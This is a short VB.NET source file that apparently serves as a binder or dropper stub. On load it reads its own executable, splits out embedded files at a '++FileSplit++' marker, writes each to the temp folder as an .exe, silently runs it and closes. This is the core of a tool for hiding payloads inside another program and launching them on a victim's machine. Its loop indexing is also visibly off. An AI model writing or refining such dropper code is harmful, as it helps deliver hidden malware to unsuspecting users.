'Imports System.IO

Public Class Form1
    Const FileSplit = "++FileSplit++"

    Dim i As Integer = 1
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Dim TPath As String = System.IO.Path.GetTempPath
            Dim file1, filez() As String
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            file1 = Space(LOF(1))
            FileGet(1, file1)
            FileClose(1)
            filez = Split(file1, FileSplit)
            Dim ack As String = filez.Count
            For ii = 0 To filez.Count
                FileOpen(3, TPath & "\abc" & i & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(3, filez(i))
                FileClose(3)
                System.Diagnostics.Process.Start(TPath & "\" & "abc" & i & ".exe")
                i = i + 1
            Next
            Me.Close()
            End
        Catch ex As Exception
            Me.Close()
            End
        End Try
        Me.Close()
        End
    End Sub
End Class
